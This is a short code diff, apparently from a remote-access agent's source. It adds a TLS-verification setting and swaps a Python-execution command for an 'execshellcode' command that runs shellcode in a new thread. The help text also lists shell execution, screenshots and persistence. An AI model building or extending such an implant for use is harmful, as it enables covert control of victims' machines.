@@ -3,6 +3,7 @@ HELLO_INTERVAL = __HELLO_INTERVAL__
 IDLE_TIME = __IDLE_TIME__
 MAX_FAILED_CONNECTIONS = __MAX_FAILED_CONNECTIONS__
 PERSIST = __PERSIST__
+TLS_VERIFY = __TLS_VERIFY__
 HELP = """
 <any shell command>
 Executes the command in a shell and return its output.
@@ -19,14 +20,14 @@ Creates a zip archive of the folder.
 screenshot
 Takes a screenshot.
 
-python <command|file>
-Runs a Python command or local file.
-
 persist
 Installs the agent.
 
 clean
 Uninstalls the agent.
+
+execshellcode <shellcode>
+Executes shellcode in a new thread.
 
 exit
 Kills the agent.
